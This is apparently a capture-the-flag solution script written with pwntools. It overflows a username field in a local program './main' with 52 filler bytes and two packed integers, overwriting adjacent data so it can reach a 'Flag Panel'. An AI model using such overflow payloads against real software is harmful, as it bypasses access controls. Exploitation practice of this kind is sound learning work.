from pwn import *

p = process('./main')

p.sendline(b'1') # Login

p.sendline(b'hh')

p.sendline(b'hh')

p.sendline(b'2') # Edit username

p.sendline(b'A'*52 + p32(1) + p32(1))

p.sendline(b'3') # Access Flag Panel

p.interactive()
